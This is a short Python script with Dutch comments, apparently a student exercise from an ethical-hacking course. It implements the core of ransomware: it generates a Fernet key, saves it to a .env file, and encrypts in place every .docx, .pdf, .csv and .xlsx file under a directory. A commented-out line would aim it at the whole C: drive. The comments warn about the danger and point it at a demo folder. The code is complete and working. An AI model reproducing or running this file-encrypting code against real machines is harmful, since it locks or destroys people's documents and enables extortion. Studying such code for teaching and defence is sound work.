import os
from cryptography.fernet import Fernet
from dotenv import load_dotenv, set_key


# print("Dit is iets te gevaarlijk zo maar te runnen. pls lees lines 6-11 van dit script")
# exit()
# omdat dit script alle files op je pc zal proberen encrypteren is het best om zelf een folder te selecteren die geencrypeert mag worden
# haal line 36 uit comment als je echt wilt riskeren al je files kwijt te zijn.
# anders kan je line 37 aan passen om een veilige map aan te duiden.
# Ik doe dit niet in een config omdat dit standaard niet een optie moet zijn



def encrypt_file(key,file_path):                # PLAYING WITH FIRE!!!!!!!!!!!!!!!
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)



load_dotenv(dotenv_path='./.env',override=True)
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')

if ENCRYPTION_KEY == None:
    key = Fernet.generate_key()
    try:
        set_key('.env',"ENCRYPTION_KEY",key)
    except:
        print(key)
    file_types = ["docx", "pdf", "csv", "xlsx"]   # , "md", "txt"

    # path = "C:/"                     # voor alle files af te runnen ipv 1 file
    path = "/C:/Users/michi/School/AP/jaar4/ethicalHacking/Deel2/demofolder"
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            # print(file.split("."))
            if file.split(".")[-1] in file_types:
                encrypt_file(key,file_path)
